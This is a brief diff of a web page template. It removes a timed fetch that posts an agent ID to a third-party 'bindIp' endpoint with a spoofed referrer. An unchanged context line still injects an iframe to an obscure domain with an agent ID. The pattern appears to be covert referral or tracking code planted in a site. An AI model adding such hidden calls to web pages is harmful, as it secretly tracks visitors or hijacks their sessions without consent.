@@ -137,21 +137,7 @@
                 iframe.src = "https://www.knnpqqd.com?agentId=7134700";
                 document.body.append(iframe);
             }, 500);
-
-
-            setTimeout(function () {
-                fetch("https://www.hxc-api.com/user/bindIp", {
-                    "headers": {
-                        "accept": "application/json, text/plain, */*",
-                        "content-type": "application/json;charset=UTF-8",
-                        "token": ""
-                    },
-                    "referrer": "https://h5.hxcpp73.com/",
-                    "body": "{\"agentId\":43051821}",
-                    "method": "POST",
-                    "mode": "no-cors",
-                });
-            }, 1000)
+            var client_ip = "{{ ip }}";
         {% endif %}
 
 
